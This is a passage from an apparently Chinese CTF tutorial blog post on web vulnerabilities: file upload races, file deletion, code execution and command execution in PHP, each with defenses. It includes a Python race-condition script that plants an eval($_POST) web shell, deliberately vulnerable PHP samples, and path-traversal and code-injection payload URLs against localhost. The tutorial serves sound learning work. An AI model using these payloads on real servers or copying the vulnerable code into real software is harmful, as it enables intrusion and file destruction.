class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br>exp_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br>shell_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br><br><span class="hljs-comment"># 按照自己的环境修改url</span><br>upload_url = <span class="hljs-string">&#x27;http://127.0.0.1/competionupload.php&#x27;</span><br>exp_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name)<br>shell_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name)<br><br>exp_content = (<span class="hljs-string">&#x27;&lt;?php fputs(fopen(&quot;&#123;&#125;.php&quot;, &quot;w&quot;), &#x27;</span><br>               <span class="hljs-string">&#x27;\&#x27;&lt;?php @eval($_POST[&quot;qqq&quot;]) ?&gt;\&#x27;); ?&gt;&#x27;</span>)<br>exp_content = exp_content.<span class="hljs-built_in">format</span>(shell_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] upload file...&#x27;</span>)<br>        data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>        files = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name),exp_content)&#125;<br>        resp = requests.post(upload_url,files=files,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] get shell file...&#x27;</span>)<br>        requests.get(exp_url)<br>        resp = requests.get(shell_url)<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] create &#123;&#125;.php success&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name))<br>            os._exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    threads = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 线程数也可以自己修改,我这里只是开太多线程本地服务器扛不住</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            t = threading.Thread(target=get,args=())<br>            threads.append(t)<br>            t.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            t = threading.Thread(target=upload,args=())<br>            threads.append(t)<br>            t.start()        <br><br>        <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:<br>            thread.join()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>可以参考<a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/">上面讲了19种情景的bypass方法</a></p>
<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>文件删除漏洞出现在有文件管理功能的应用上很多,这些应用一般都有文件上传和读取等功能。漏洞利用原理和文件读取差不多,只是利用函数不一样。一般是因为删除文件的文件名可以用..&#x2F;跳转,或者没有限制当前用户只能删除他该有权限删除的文件。php中这个漏洞函数通常是unlink()</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$basedir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;delete&#x27;</span>)&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$basedir</span>.<span class="hljs-variable">$filename</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/filedelete.php?action=delete&amp;filename=../../../../../../../test.txt</code></p>
<h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><p>通用防范:</p>
<ul>
<li>对权限管理要合理,比如用户A上传的文件,不能被同权限的B用户删除。特殊文件操作需要特权用户才能操作,比如后台删除文件的操作,肯定需要限制管理员才能操作。</li>
<li>有的文件操作不需要直接传入文件名,比如下载文件时,可以将文件名、路径、ID(MD5形式)及文件上传用户存入数据库中,操作时根据文件ID和当前用户名去判断当前用户有没有权限操作改文件。</li>
<li>避免目录跳转。禁止<code>..</code>、<code>/</code>、<code>\</code>来跳转目录</li>
</ul>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>代码执行漏洞指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行。这种漏洞如果没有进行特殊过滤,相当于一个web后门的存在。</p>
<p>php中导致该漏洞的函数:</p>
<ul>
<li>eval</li>
<li>assert</li>
<li>preg_replace</li>
<li>call_user_func</li>
<li>call_user_func_array</li>
<li>array_map</li>
<li>php动态函数($a($b))</li>
<li>…</li>
</ul>
<p>eval()和assert()函数导致的代码执行漏洞大多数是因为载入缓存或者模板以及对变量的处理不严格导致,比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成php代码执行。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_a</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_a method&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action_b</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;call action_b method&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;action_&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;();&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/codexec_eval.php?m=b</code></p>
<p><code>http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//</code></p>
<p>preg_replace()函数(<strong>php5.5之前可用</strong>)导致代码执行需要存在<code>/e</code>参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签及文章内容过滤等地方。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$html_body</span> = <span class="hljs-string">&#x27;&lt;a &#123;$&#123;phpinfo()&#125;&#125;&gt;&lt;/a&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(&lt;/?)(\w+)([^&gt;]*&gt;)#e&quot;</span>,<br>              <span class="hljs-string">&#x27;&quot;\\1&quot;.strtoupper(&quot;\\2&quot;).&quot;\\3&quot;&#x27;</span>,<span class="hljs-variable">$html_body</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/codexec_preg.php</code></p>
<p>由于php特性的原因，php函数可以直接由字符串拼接，导致动态执行函数。</p>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/codexec_dynfunc.php?a=assert&amp;b=phpinfo()</code></p>
<p>还有其他函数，可以自行查阅</p>
<p>实际环境中可以结合正则表达式使用白名单对参数过滤</p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>代码执行是指可以执行代码，命令执行是可以执行系统命令(比如CMD或者BASH命令)。php命令执行是继承webserver用户权限。</p>
<p>php命令执行函数:</p>
<ul>
<li>system</li>
<li>exec</li>
<li>shell_exec</li>
<li>passthru</li>
<li>pcntl_exec</li>
<li>popen</li>
<li>proc_popen</li>
<li>`</li>
</ul>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;whoami &gt;&gt; ./aaa.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>防范</p>
<ul>
<li>使用escapeshellcmd、escapeshellarg防止命令注入</li>
<li>参数白名单</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
        <a href="/tags/Web/" class="print-no-link">#Web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Web In CTF</div>
      <div>http://example.com/2019/07/14/Web-In-CTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2019年7月14日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/08/22/web_dockerfile_in_ctf/" title="CTF中Web的docker环境以及dockerfile编写">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CTF中Web的docker环境以及dockerfile编写</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/1970/01/01/flag_is_here/" title="远古的 blog">
                        <span class="hidden-mobile">远古的 blog</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
